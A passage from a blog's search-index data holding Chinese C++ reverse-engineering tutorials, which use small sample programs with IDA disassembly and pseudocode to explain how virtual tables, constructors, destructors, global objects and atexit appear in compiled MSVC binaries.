this;&#125;\n\n上面代码中的类定义了两个虚函数和一个数据成员。如果这个类没有定义虚函数，则其长度为4，定义了虚函数后，因为还含有隐藏数据成员（虚表指针），所以32位程序大小为8，64程序大小为16\n类Person确实多出了一个指针大小数据，这个数据用于保存虚表指针。在虚表指针指向的函数指针数组中，保存着虚函数getAge和setAge的首地址。对于开发者而言，虚表和虚表指针都是隐藏的，在常规的开发过程中感觉不到它们的存在。对象中的虚表指针和虚表的关系如下图所示。\n\n所以有了虚表指针，就可以通过该指针得到类中所有虚函数的首地址。\n上面代码中编译器为类Person提供了默认的构造函数。该默认构造函数先取得虚表的首地址，然后赋值到虚表指针中。虚表信息如下图：\n\n上图显示了虚表中的两个地址信息，分别为成员函数getAge和setAge的地址。因此，得到虚表指针就相当于得到了类中所有虚函数的首地址。对象的虚表指针初始化是通过编译器在构造函数内插入代码完成的。在用户没有编写构造函数时，因为必须初始化虚表指针，所以编译器会提供默认的构造函数，以完成虚表指针的初始化。\n因为虚表信息在编译后会被链接到对应的执行文件中，所以获得的虚表地址是一个相对固定的地址。虚表中虚函数的地址排列顺序因虚函数在类中的声明顺序而定，先声明的虚函数的地址会被排列在虚表靠前的位置。第一个被声明的虚函数的地址在虚表的首地址处。\n上面代码展示了默认构造函数初始化虚表指针的过程。对于含有构造函数的类而言，其虚表初始化过程和默认构造函数相同，都是在对象首地址处保存虚表的首地址。\n在虚表指针的初始化过程中，对象执行了构造函数后，就得到了虚表指针，当其他代码访问这个对象的虚函数时，会根据对象的首地址，取出对应的虚表元素。当函数被调用时，会间接访问虚表，得到对应的虚函数首地址并调用执行。这种调用方式是一个间接的调用过程，需要多次寻址才能完成。\n调用自身类中的虚函数上一节中通过虚表间接寻址访问的情况只有在使用对象的指针或引用调用虚函数的时候才会出现。当直接使用对象调用自身虚函数时，没有必要查表访问。这是因为已经明确调用的是自身成员函数，根本没有构成多态性，查询虚表只会画蛇添足，降低程序的执行效率，所以将这种情况处理为直接调用方式。\n123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Person &#123;public:\tvirtual int getAge() &#123; //虚函数定义\t\treturn age;\t&#125;\tvirtual void setAge(int age) &#123; //虚函数定义\t\tthis-&gt;age = age;\t&#125;private:\tint age;&#125;;int main(int argc, char* argv[]) &#123;\tPerson person;\tperson.setAge(20);\tprintf(&quot;%d\\n&quot;, person.getAge());\treturn 0;&#125;\n\nida汇编及伪代码视图：\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576//main函数.text:004010C0 ; int __cdecl main(int argc, const char **argv, const char **envp).text:004010C0 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p.text:004010C0.text:004010C0 var_C           = byte ptr -0Ch.text:004010C0 var_4           = dword ptr -4.text:004010C0 argc            = dword ptr  8.text:004010C0 argv            = dword ptr  0Ch.text:004010C0 envp            = dword ptr  10h.text:004010C0.text:004010C0                 push    ebp.text:004010C1                 mov     ebp, esp.text:004010C3                 sub     esp, 0Ch.text:004010C6                 mov     eax, ___security_cookie.text:004010CB                 xor     eax, ebp.text:004010CD                 mov     [ebp-4], eax.text:004010D0                 lea     ecx, [ebp-0Ch]  ; 传递this指针.text:004010D3                 call    sub_401110      ; 调用默认构造函数.text:004010D8                 push    14h.text:004010DA                 lea     ecx, [ebp-0Ch]  ; 传递this指针.text:004010DD                 call    sub_4010A0      ; 直接调用函数setAge.text:004010E2                 lea     ecx, [ebp-0Ch]  ; 传递this指针.text:004010E5                 call    unknown_libname_1 ; 直接调用函数getAge.text:004010EA                 push    eax             ; char.text:004010EB                 push    offset Format   ; &quot;%d\\n&quot;.text:004010F0                 call    printf.text:004010F5                 add     esp, 8.text:004010F8                 xor     eax, eax.text:004010FA                 mov     ecx, [ebp-4].text:004010FD                 xor     ecx, ebp        ; StackCookie.text:004010FF                 call    @__security_check_cookie@4 ; __security_check_cookie(x).text:00401104                 mov     esp, ebp.text:00401106                 pop     ebp.text:00401107                 retn.text:00401107 _main           endpint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char v3; // al  char v5[8]; // [esp+0h] [ebp-Ch] BYREF  sub_401110(v5);  sub_4010A0(20);  v3 = unknown_libname_1(v5);  sub_401040(&quot;%d\\n&quot;, v3);  return 0;&#125;//setAge函数.text:004010A0 ; _DWORD *__thiscall sub_4010A0(_DWORD *this, int).text:004010A0 sub_4010A0      proc near               ; CODE XREF: _main+1D↓p.text:004010A0                                         ; DATA XREF: .rdata:00402114↓o.text:004010A0.text:004010A0 var_4           = dword ptr -4.text:004010A0 arg_0           = dword ptr  8.text:004010A0.text:004010A0                 push    ebp             ; setAge函数.text:004010A1                 mov     ebp, esp.text:004010A3                 push    ecx.text:004010A4                 mov     [ebp-4], ecx.text:004010A7                 mov     eax, [ebp-4]    ; eax=this.text:004010AA                 mov     ecx, [ebp+8]    ; [ebp+8]为age.text:004010AD                 mov     [eax+4], ecx    ; this-&gt;age=age.text:004010B0                 mov     esp, ebp.text:004010B2                 pop     ebp.text:004010B3                 retn    4               ; 分析显示，虚函数与其他非虚函数的成员函数的实现流程一致，函数内部无差别.text:004010B3 sub_4010A0      endp_DWORD *__thiscall sub_4010A0(_DWORD *this, int a2)&#123;  _DWORD *result; // eax  result = this;  this[1] = a2;  return result;&#125;\n\n上面代码直接通过对象调用自身的成员虚函数，因此编译器使用了直接调用函数的方式，没有访问虚表指针，间接获取虚函数地址。对象的多态性常常体现在派生和继承关系中。\n仔细分析虚表指针的原理，我们会发现编译器隐藏了初始化虚表指针的实现代码，当类中出现虚函数时，必须在构造函数中对虚表指针执行初始化操作，而没有虚函数类对象构造时，不会进行初始化虚表指针的操作。由此可见，在分析构造函数时，又增加了一个新特征——虚表指针初始化。根据以上分析，如果排除开发者伪造编译器生成的代码误导分析人员的情况，我们就可以给出一个结论：对于单线继承的类结构，在某个成员函数中，将this指针的地址初始化为虚表首地址时，可以判定这个成员函数为构造函数。\n析构函数分析12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Person &#123;public:\t~Person() &#123;\t\tprintf(&quot;~Person()\\n&quot;);\t&#125;\tvirtual int getAge() &#123; //虚函数定义\t\treturn age;\t&#125;\tvirtual void setAge(int age) &#123; //虚函数定义\t\tthis-&gt;age = age;\t&#125;private:\tint age;&#125;;int main(int argc, char* argv[]) &#123;\tPerson person;\treturn 0;&#125;\n\nida汇编及伪代码视图：\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465//main函数.text:004010F0 ; int __cdecl main(int argc, const char **argv, const char **envp).text:004010F0 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p.text:004010F0.text:004010F0 var_10          = dword ptr -10h.text:004010F0 var_C           = dword ptr -0Ch.text:004010F0 var_4           = dword ptr -4.text:004010F0 argc            = dword ptr  8.text:004010F0 argv            = dword ptr  0Ch.text:004010F0 envp            = dword ptr  10h.text:004010F0.text:004010F0                 push    ebp.text:004010F1                 mov     ebp, esp.text:004010F3                 sub     esp, 10h.text:004010F6                 mov     eax, ___security_cookie.text:004010FB                 xor     eax, ebp.text:004010FD                 mov     [ebp-4], eax.text:00401100                 lea     ecx, [ebp-0Ch]  ; 传递this指针.text:00401103                 call    sub_401130      ; 调用默认构造函数.text:00401108                 mov     dword ptr [ebp-10h], 0.text:0040110F                 lea     ecx, [ebp-0Ch]  ; 传递this指针.text:00401112                 call    sub_401080      ; 调用析构函数.text:00401117                 mov     eax, [ebp-10h].text:0040111A                 mov     ecx, [ebp-4].text:0040111D                 xor     ecx, ebp        ; StackCookie.text:0040111F                 call    @__security_check_cookie@4 ; __security_check_cookie(x).text:00401124                 mov     esp, ebp.text:00401126                 pop     ebp.text:00401127                 retn.text:00401127 _main           endpint __cdecl main(int argc, const char **argv, const char **envp)&#123;  _DWORD v4[2]; // [esp+4h] [ebp-Ch] BYREF  sub_401130(v4);  sub_401080((char)v4);  return 0;&#125;//析构函数.text:00401080 ; int __fastcall sub_401080(_DWORD *).text:00401080 sub_401080      proc near               ; CODE XREF: _main+22↓p.text:00401080.text:00401080 var_4           = dword ptr -4.text:00401080.text:00401080                 push    ebp             ; 析构函数.text:00401081                 mov     ebp, esp.text:00401083                 push    ecx             ; char.text:00401084                 mov     [ebp-4], ecx    ; [ebp-4]保存this指针.text:00401087                 mov     eax, [ebp-4]    ; eax得到this指针，这是虚表的位置.text:0040108A                 mov     dword ptr [eax], offset off_402118 ; 将当前类虚表首地址赋值到虚表指针中.text:00401090                 push    offset Format   ; &quot;~Person()\\n&quot;.text:00401095                 call    printf.text:0040109A                 add     esp, 4.text:0040109D                 mov     esp, ebp.text:0040109F                 pop     ebp.text:004010A0                 retn.text:004010A0 sub_401080      endpint __fastcall sub_401080(_DWORD *a1)&#123;  *a1 = &amp;off_402118;  return printf(&quot;~Person()\\n&quot;, (char)a1);&#125;\n\n通过比较代码中构造函数与析构函数的流程可知，二者对虚表的操作几乎相同，都是将虚表指针设置为\n当前对象所属类中的虚表首地址。然而二者看似相同，事实上差别很大。\n构造函数中完成的是初始化虚表指针的工作，此时虚表指针并没有指向虚表地址，而执行析构函数时，对象的虚表指针已经指向了某个虚表首地址。\n在析构函数中填写虚表是否没必要呢？\n这里实际上是在还原虚表指针，让其指向自身的虚表首地址，防止在析构函数中调用虚函数时取到非自身虚表，从而导致函数调用错误。\n判定析构函数的依据和虚表指针相关，识别析构函数的充分条件是写入虚表指针，但是请注意，它与前面讨论的虚表指针初始化不同。所谓虚表指针初始化，是指对象原来的虚表指针位置不是有效的，经过初始化才指向了正确的虚函数表。而写入虚表指针，是指对象的虚表指针可能是有效的，已经指向了正确的虚函数表，将对象的虚表指针重新赋值后，其指针可能指向了另一个虚表，虚表的内容不一定和原来的一样。\n结合IDA中的引用参考可知，只要确定一个构造函数或者析构函数，我们就能顺藤摸瓜找到其他构造函数以及类之间的关系。\n虚函数的识别在判断是否为虚函数时，我们要做的是鉴别类中是否出现了以下特征。\n\n类中隐式定义了一个数据成员。\n\n该数据成员在首地址处，占一个指针大小。\n\n构造函数会将此数据成员初始化为某个数组的首地址。\n\n这个地址属于数据区，是相对固定的地址。\n\n在这个数组内，每个元素都是函数指针。\n\n仔细观察这些函数，它们被调用时，第一个参数必然是this指针（要注意调用约定）。\n\n在这些函数内部，很有可能对this指针使用相对间接的访问方式。\n\n\n有了虚表，类中所有虚函数都被囊括其中。查找这个虚表需要得到指向它的虚表指针，虚表指针又在构造函数中被初始化为虚表首地址。由此可见，要想找到虚函数，就要得到虚表的首地址。\n经过层层分析，识别虚函数最终转变成识别构造函数或者析构函数。构造函数与虚表指针的初始化有依赖关系。对于构造函数而言，初始化虚表指针会简化识别构造函数的过程，而初始化虚表指针又必须在构造函数内完成，因此在分析构造函数时，应重点考察对象首地址处被赋予的值。\n查询this指针指向的地址处的内存数据，跟踪并分析其数据是否为地址信息，是否对这个指针的内容进行赋值操作，赋值后的数据是否指向了某个地址表，表中各单元项是否为函数首地址。有了这一系列的鉴定后，就可得知此成员函数是否为构造函数。识别出构造函数后，即可顺藤摸瓜找到所有的虚函数。\n1234567; 具有成员函数特征，传递对象首地址作为this指针lea ecx,[ebp-8] ;获取对象首地址call XXXXXXXXh ;调用函数;调用函数的实现代码内mov reg, this ;某寄存器得到对象首地址;向对象首地址处写入地址数据，查看并确认此地址数据是否为函数地址表的首地址mov dword ptr [reg], XXXXXXXXh\n\n在分析过程中遇到上述代码时，应高度怀疑其为构造函数或者析构函数。查看并确认此地址数据是否为函数地址表的首地址，即可判断是否为构造或析构函数。\n在对构造函数和析构函数进行区分时，通过分析它们的特性可知：构造函数一定出现在析构函数之前，而且在构造函数执行前虚表指针没有指向虚表的首地址；而析构函数出现在所有成员函数之后，在实现过程中，虚表指针已经指向了某一个虚表的首地址。\n识别出虚表的首地址后，就可以利用IDA的引用参考功能得到所有引用此虚表首地址的函数所在的地址标号。只有构造函数和析构函数中存在对虚表指针的修改操作，等同于定位到了引用此虚表的所有构造函数和析构函数，这使得识别类中的构造函数和析构变得更为简单，也更为准确。\n含有虚函数的全局对象12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Global &#123;public:\tGlobal() &#123; //无参构造函数\t\tprintf(&quot;Global\\n&quot;);\t&#125;\tGlobal(int n) &#123; //有参构造函数\t\tprintf(&quot;Global(int n) %d\\n&quot;, n);\t&#125;\tGlobal(const char* s) &#123; //有参构造函数\t\tprintf(&quot;Global(char *s) %s\\n&quot;, s);\t&#125;\tvirtual ~Global() &#123; //虚析构函数\t\tprintf(&quot;~Global()\\n&quot;);\t&#125;\tvoid show() &#123;\t\tprintf(&quot;Object Addr: 0x%p&quot;, this);\t&#125;&#125;;Global g_global1;Global g_global2(10);Global g_global3(&quot;hello C++&quot;);int main(int argc, char* argv[]) &#123;\tg_global1.show();\tg_global2.show();\tg_global3.show();\treturn 0;&#125;\n\n上面代码定义了3个全局对象，分别调用了3种不同的构造函数。main()函数中使用全局对象调用了成员函数show。\n定位全局对象12345678910111213141516171819.text:00401200 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401200 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p.text:00401200.text:00401200 argc            = dword ptr  8.text:00401200 argv            = dword ptr  0Ch.text:00401200 envp            = dword ptr  10h.text:00401200.text:00401200                 push    ebp.text:00401201                 mov     ebp, esp.text:00401203                 mov     ecx, offset unk_4033B8 ; 获取全局对象1首地址 ，&amp;g_global1.text:00401208                 call    sub_4011B0      ; 调用show函数.text:0040120D                 mov     ecx, offset unk_4033BC ; 获取对象2首地址，&amp;g_global2.text:00401212                 call    sub_4011B0      ; 调用show函数.text:00401217                 mov     ecx, offset unk_4033C0 ; 获取对象3首地址，&amp;g_global3.text:0040121C                 call    sub_4011B0      ; 调用show函数.text:00401221                 xor     eax, eax.text:00401223                 pop     ebp.text:00401224                 retn.text:00401224 _main           endp\n\n上面main函数汇编代码中，可以看到有三个全局地址标号：offset unk_4033B8、offset unk_4033BC、offset unk_4033C0，这些即为全局对象。\n有了全局对象的地址标号以后，接下来要对它们重新命名，如下所示。\n12345offset unk_4033B8 g_global1offset unk_4033BC g_global2offset unk_4033C0 g_global3\n\natexit函数12345678910111213//构造代理函数.text:00401000 ; int sub_401000().text:00401000 sub_401000      proc near               ; DATA XREF: .rdata:004020D4↓o.text:00401000                 push    ebp             ; 构造代理函数1.text:00401001                 mov     ebp, esp.text:00401003                 mov     ecx, offset g_global1 ; char.text:00401008                 call    sub_4010F0      ; 构造函数1.text:0040100D                 push    offset sub_401EF0 ; void (__cdecl *)()，析构代理函数1.text:00401012                 call    _atexit.text:00401017                 add     esp, 4.text:0040101A                 pop     ebp.text:0040101B                 retn.text:0040101B sub_401000      endp\n\n根据上面的代码可见，在全局对象构造代理函数的分析中有个神秘的调用，这个函数的关键之处是调用atexit，查阅相关文档可知，该函数可以在退出main()函数后执行开发者自定义的函数（即注册终止函数），其函数声明如下。\n1int cdecl atexit(void ( cdecl *)(void));\n\n只有一个无参且无返回值的函数指针作为atexit的参数，这个函数指针会添加在终止函数的数组中，在main()函数执行完毕后，由_execute_onexit_table函数倒序执行数组中的每个函数。\n了解这个函数后，atexit的参数sub_401EF0。将地址401EF0的内容反汇编之后不难发现，这个401EF0就是析构函数的代理。\n123456789.text:00401EF0 ; void __cdecl sub_401EF0().text:00401EF0 sub_401EF0      proc near               ; DATA XREF: sub_401000+D↑o.text:00401EF0                 push    ebp.text:00401EF1                 mov     ebp, esp.text:00401EF3                 mov     ecx, offset g_global1 ; char.text:00401EF8                 call    sub_401180      ; 析构函数.text:00401EFD                 pop     ebp.text:00401EFE                 retn.text:00401EFE sub_401EF0      endp\n\n那么，atexit函数理所当然地成为我们寻找全局对象析构函数的指路灯。注意，在IDA的环境下，C的调用约定是在函数名前加上下划线“_”。查找函数_atexit，查看调用它的地址，如下图所示：\n\n可以看到至少有两个地址调用这个函数，分别为0x00401000和0x00401020。双击0x00401000这个地址，找到\n_atexit的函数调用处：\n123456789101112131415161718192021222324252627282930313233343536373839404142.text:00401000 ; int sub_401000().text:00401000 sub_401000      proc near               ; DATA XREF: .rdata:004020D4↓o.text:00401000                 push    ebp             ; 构造代理函数1.text:00401001                 mov     ebp, esp.text:00401003                 mov     ecx, offset g_global1 ; char.text:00401008                 call    sub_4010F0      ; 构造函数1.text:0040100D                 push    offset sub_401EF0 ; void (__cdecl *)()，析构代理函数1.text:00401012                 call    _atexit.text:00401017                 add     esp, 4.text:0040101A                 pop     ebp.text:0040101B                 retn.text:0040101B sub_401000      endp.text:00401EF0 ; void __cdecl sub_401EF0().text:00401EF0 sub_401EF0      proc near               ; DATA XREF: sub_401000+D↑o.text:00401EF0                 push    ebp.text:00401EF1                 mov     ebp, esp.text:00401EF3                 mov     ecx, offset g_global1 ; char.text:00401EF8                 call    sub_401180      ; 析构函数.text:00401EFD                 pop     ebp.text:00401EFE                 retn.text:00401EFE sub_401EF0      endp.text:00401180 ; int __fastcall sub_401180(_DWORD *).text:00401180 sub_401180      proc near               ; CODE XREF: sub_4011D0+A↓p.text:00401180                                         ; sub_401EF0+8↓p ....text:00401180.text:00401180 var_4           = dword ptr -4.text:00401180.text:00401180                 push    ebp.text:00401181                 mov     ebp, esp.text:00401183                 push    ecx             ; char.text:00401184                 mov     [ebp-4], ecx.text:00401187                 mov     eax, [ebp-4].text:0040118A                 mov     dword ptr [eax], offset off_402178.text:00401190                 push    offset aGlobal_0 ; &quot;~Global()\\n&quot;.text:00401195                 call    printf.text:0040119A                 add     esp, 4.text:0040119D                 mov     esp, ebp.text:0040119F                 pop     ebp.text:004011A0                 retn.text:004011A0 sub_401180      endp\n\n在调用_atexit函数前，压入了一个参数，这个参数为地址标号，此地址标号指向的地址正是全局对象g_global1的析构代理函数。进入析构代理函数，可以看到调用了一个函数sub_401180，这个函数正是全局对象的析构函数，在sub_401180 中 发 现 了 一 句 代 码 “mov     dword ptr [eax], offset off_402178”，这就是在析构函数中设置的虚表信息，offset off_402178是虚表首地址，将其重新命名为Global_vtable。\n使用快捷键x对Global_vtable使用交叉参考，如下图所示：\n\n从上图可知，共有4处引用此虚表。其中3处对应构造函数，另外1处对应析构函数：\n12340x004010F0   无参构造函数0x00401120   有参构造函数（int n）0x00401150   有参构造函数（char *s）0x00401180   析构函数\n\n0x00401180这个地址便是析构函数写入虚表指令的 地 址  。 在 IDA 中 查 看 地 址0x004011下所示：\n12345678910111213141516171819.text:00401180 ; int __fastcall sub_401180(_DWORD *).text:00401180 sub_401180      proc near               ; CODE XREF: sub_4011D0+A↓p.text:00401180                                         ; sub_401EF0+8↓p ....text:00401180.text:00401180 var_4           = dword ptr -4.text:00401180.text:00401180                 push    ebp             ; 析构函数.text:00401181                 mov     ebp, esp.text:00401183                 push    ecx             ; char.text:00401184                 mov     [ebp-4], ecx.text:00401187                 mov     eax, [ebp-4].text:0040118A                 mov     dword ptr [eax], offset Global_vtable.text:00401190                 push    offset aGlobal_0 ; &quot;~Global()\\n&quot;.text:00401195                 call    printf.text:0040119A                 add     esp, 4.text:0040119D                 mov     esp, ebp.text:0040119F                 pop     ebp.text:004011A0                 retn.text:004011A0 sub_401180      endp\n\n结合虚表可以方便快捷地根据析构函数定位全局对象所属类的构造函数的调用情况。\n\n\n\n\n\n\n\n\n\n“Chart of xrefs from”指的是某数据或函数的来源，IDA的中文版翻译为“交叉参考来自……”是贴切的，因此本书使用“交叉参考来自……”的译法。\n“Chart of xrefs to”指的是数据或函数的引用者（读取者），译为“交叉参考到……”也是很贴切的，故本书使用此种译法\n小结关 于 atexit 的 实 现 原 理 ， 请 查 阅 VS2019 安 装 目 录 下 的\\Community\\VC\\Tools\\MSVC\\14.22.27905\\crt\\src\\vcruntime\\utility.cpp文件。如果程序存在全局对象、静态对象或者调用了atexit函数，那么在执行_initterm函数(**it)()的时候会执行_register_onexit_function函数，这个函数用于注册终止函数，这个终止函数由_onexit函数负责维护。在main()函数退出后，调用exit函数，exit函数又会调用_execute_onexit_table。在_execute_onexit_table函数内，遍历终止所有终止函数。\n","slug":"C++逆向——虚函数","date":"2023-02-13T06:11:19.000Z","categories_index":"","tags_index":"c++逆向","author_index":"0netry"},{"id":"b0a53c23c95ed95e45a9b9b266d30456","title":"C++逆向——析构函数","content":"析构函数的出现时机对象何时被销毁呢？根据对象所在的作用域，当程序流程执行到作用域结束处时，会释放该作用域内的所有对象，在释放的过程中会调用对象的析构函数。析构函数与构造函数的出现时机相同，但并非有构造函数就一定会有对应的析构函数。析构函数的触发时机也需要视情况而定，主要分如下几种情况。\n\n局部对象：作用域结束前调用析构函数。\n\n堆对象：释放堆空间前调用析构函数。\n\n参数对象：退出函数前，调用参数对象的析构函数。\n\n返回对象：如无对象引用定义，退出函数后，调用返回对象的析构函数，否则与对象引用的作用域一致。\n\n全局对象：main()函数返回后调用析构函数。\n\n静态对象：main()函数返回后调用析构函数。\n\n\n局部对象要考察局部对象析构函数出现的时机，应重点考察其作用域的结束处。与构造函数相比较而言，析构函数的出现时机相对固定。对于局部对象，当对象所在作用域结束后，将销毁该作用域所有变量的栈空间，此时便是析构函数出现的时机\n12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Person &#123;public:\tPerson() &#123;\t\tage = 1;\t&#125;\t~Person() &#123;\t\tprintf(&quot;~Person()\\n&quot;);\t&#125;private:\tint age;&#125;;int main(int argc, char* argv[]) &#123;\tPerson person;\treturn 0; //退出函数后调用析构函数&#125;\n\n\n上面代码中类Person提供了析构函数，在对象Person所在的作用域结束处，调用了析构函数~Person()。析构函数同样属于成员函数，因此在调用的过程中也需要传递this指针。\n析构函数与构造函数略有不同，析构函数不支持函数重载，只有一个参数，即this指针，而且编译器隐藏了这个参数的传递过程。对于开发者而言，它是一个隐藏了this指针的无参函数。\n堆对象堆对象比较特殊，编译器将它的生杀大权交给了使用者。使用new申请堆对象空间后，何时释放对象要看开发者在哪里调用delete释放对象所在的堆空间。delete的使用便是找到堆对象调用析构函数的关键点。\n堆对象析构函数的调用123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Person &#123;public:\tPerson() &#123;\t\tage = 20;\t&#125;\t~Person() &#123;\t\tprintf(&quot;~Person()\\n&quot;);\t&#125;\tint age;&#125;;int main(int argc, char* argv[]) &#123;\tPerson* person = new Person();\tperson-&gt;age = 21; //为了便于讲解，这里没检查指针\tprintf(&quot;%d\\n&quot;, person-&gt;age);\tdelete person;\treturn 0;&#125;\n\n\n\nida汇编及伪代码视图：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165//main函数.text:004010C0 ; int __cdecl main(int argc, const char **argv, const char **envp).text:004010C0 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p.text:004010C0.text:004010C0 var_24          = dword ptr -24h.text:004010C0 var_20          = dword ptr -20h.text:004010C0 var_1C          = dword ptr -1Ch.text:004010C0 var_18          = dword ptr -18h.text:004010C0 Block           = dword ptr -14h.text:004010C0 var_10          = dword ptr -10h.text:004010C0 var_C           = dword ptr -0Ch.text:004010C0 var_4           = dword ptr -4.text:004010C0 argc            = dword ptr  8.text:004010C0 argv            = dword ptr  0Ch.text:004010C0 envp            = dword ptr  10h.text:004010C0.text:004010C0 ; FUNCTION CHUNK AT .text:00401FE0 SIZE 0000000F BYTES.text:004010C0 ; FUNCTION CHUNK AT .text:00401FF4 SIZE 0000001D BYTES.text:004010C0.text:004010C0 ; __unwind &#123; // _main_SEH.text:004010C0                 push    ebp.text:004010C1                 mov     ebp, esp.text:004010C3                 push    0FFFFFFFFh.text:004010C5                 push    offset _main_SEH.text:004010CA                 mov     eax, large fs:0.text:004010D0                 push    eax.text:004010D1                 sub     esp, 18h.text:004010D4                 mov     eax, ___security_cookie.text:004010D9                 xor     eax, ebp.text:004010DB                 push    eax.text:004010DC                 lea     eax, [ebp-0Ch].text:004010DF                 mov     large fs:0, eax.text:004010E5                 push    4               ; Size.text:004010E7                 call    ??2@YAPAXI@Z    ; operator new(uint)，调用new函数申请内存空间.text:004010EC                 add     esp, 4.text:004010EF                 mov     [ebp-14h], eax  ; 保存申请的内存地址到临时变量.text:004010F2 ;   try &#123;.text:004010F2                 mov     dword ptr [ebp-4], 0.text:004010F9                 cmp     dword ptr [ebp-14h], 0.text:004010FD                 jz      short loc_40110C ; 检查内存空间是否申请成功.text:004010FF                 mov     ecx, [ebp-14h]  ; 传递this指针.text:00401102                 call    sub_401080      ; 申请内存成功，调用构造函数.text:00401107                 mov     [ebp-18h], eax  ; 保存构造函数返回值到临时变量.text:0040110A                 jmp     short loc_401113.text:0040110C ; ---------------------------------------------------------------------------.text:0040110C.text:0040110C loc_40110C:                             ; CODE XREF: _main+3D↑j.text:0040110C                 mov     dword ptr [ebp-18h], 0 ; 申请内存失败，赋值临时变量NULL.text:00401113.text:00401113 loc_401113:                             ; CODE XREF: _main+4A↑j.text:00401113                 mov     eax, [ebp-18h].text:00401116                 mov     [ebp-20h], eax  ; 保存申请的地址到指针变量person.text:00401116 ;   &#125; // starts at 4010F2.text:00401119                 mov     dword ptr [ebp-4], 0FFFFFFFFh.text:00401120                 mov     ecx, [ebp-20h]  ; ecx=person.text:00401123                 mov     [ebp-10h], ecx.text:00401126                 mov     edx, [ebp-10h].text:00401129                 mov     dword ptr [edx], 15h ; person-&gt;age=21.text:0040112F                 mov     eax, [ebp-10h].text:00401132                 mov     ecx, [eax].text:00401134                 push    ecx             ; 参数2，person-&gt;age.text:00401135                 push    offset aD       ; &quot;%d\\n&quot;.text:0040113A                 call    printf.text:0040113F                 add     esp, 8.text:00401142                 mov     edx, [ebp-10h].text:00401145                 mov     [ebp-1Ch], edx.text:00401148                 cmp     dword ptr [ebp-1Ch], 0 ; 检查内存空间是否申请成功.text:0040114C                 jz      short loc_40115D.text:0040114E                 push    1               ; 标记，以后讲多重继承时会详谈.text:00401150                 mov     ecx, [ebp-1Ch]  ; 传递this指针.text:00401153                 call    sub_401180      ; 内存申请成功，调用析构代理函数.text:00401158                 mov     [ebp-24h], eax.text:0040115B                 jmp     short loc_401164.text:0040115D ; ---------------------------------------------------------------------------.text:0040115D.text:0040115D loc_40115D:                             ; CODE XREF: _main+8C↑j.text:0040115D                 mov     dword ptr [ebp-24h], 0.text:00401164.text:00401164 loc_401164:                             ; CODE XREF: _main+9B↑j.text:00401164                 xor     eax, eax.text:00401166                 mov     ecx, [ebp-0Ch].text:00401169                 mov     large fs:0, ecx.text:00401170                 pop     ecx.text:00401171                 mov     esp, ebp.text:00401173                 pop     ebp.text:00401174                 retn.text:00401174 ; &#125; // starts at 4010C0.text:00401174 _main           endpint __cdecl main(int argc, const char **argv, const char **envp)&#123;  _DWORD *v4; // [esp+10h] [ebp-18h]  void *Block; // [esp+14h] [ebp-14h]  Block = operator new(4u);  if ( Block )    v4 = (_DWORD *)sub_401080(Block);  else    v4 = 0;  *v4 = 21;  sub_401040(&quot;%d\\n&quot;, *v4);  if ( v4 )    sub_401180(1);  return 0;&#125;//析构代理函数.text:00401180 ; void *__thiscall sub_401180(void *this, char).text:00401180 sub_401180      proc near               ; CODE XREF: _main+93↑p.text:00401180.text:00401180 Block           = dword ptr -4.text:00401180 arg_0           = dword ptr  8.text:00401180.text:00401180                 push    ebp.text:00401181                 mov     ebp, esp.text:00401183                 push    ecx.text:00401184                 mov     [ebp-4], ecx.text:00401187                 mov     ecx, [ebp-4]    ; 传递this指针.text:0040118A                 call    sub_4010A0      ; 调用析构函数.text:0040118F                 mov     eax, [ebp+8].text:00401192                 and     eax, 1          ; 检查析构函数标记，以后讲多重继承时会详谈.text:00401195                 jz      short loc_4011A5.text:00401197                 push    4.text:00401199                 mov     ecx, [ebp-4].text:0040119C                 push    ecx             ; 参数1，堆空间的首地址.text:0040119D                 call    sub_4011EC      ; 调用delete函数，释放堆空间.text:004011A2                 add     esp, 8.text:004011A5.text:004011A5 loc_4011A5:                             ; CODE XREF: sub_401180+15↑j.text:004011A5                 mov     eax, [ebp+Block].text:004011A8                 mov     esp, ebp.text:004011AA                 pop     ebp.text:004011AB                 retn    4.text:004011AB sub_401180      endpvoid *__thiscall sub_401180(void *this, char a2)&#123;  sub_4010A0((char)this);  if ( (a2 &amp; 1) != 0 )    sub_4011EC(this);  return this;&#125;//delete函数.text:004011EC ; void __cdecl sub_4011EC(void *Block).text:004011EC sub_4011EC      proc near               ; CODE XREF: sub_401180+1D↑p.text:004011EC                                         ; unknown_libname_2+1F↓p ....text:004011EC.text:004011EC Block           = dword ptr  8.text:004011EC.text:004011EC                 push    ebp.text:004011ED                 mov     ebp, esp.text:004011EF                 push    [ebp+Block]     ; Block.text:004011F2                 call    j_free.text:004011F7                 pop     ecx.text:004011F8                 pop     ebp.text:004011F9                 retn.text:004011F9 sub_4011EC      endpvoid __cdecl sub_4011EC(void *Block)&#123;  j_free(Block);&#125;\n\nVS中的析构函数比较特殊，在释放过程中，需要使用析构代理函数间接调用析构函数。GCC和Clang编译器虽然没有使用代理析构函数，但是其生成的代码功能与代理析构函数一致。为什么不直接调用析构函数呢？原因有很多，其中一个就是在某些情况下，需要释放的对象不止一个，如果直接调用析构函数，无法完成多对象的析构。\n多个堆对象的申请与释放12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Person &#123;public:\tPerson() 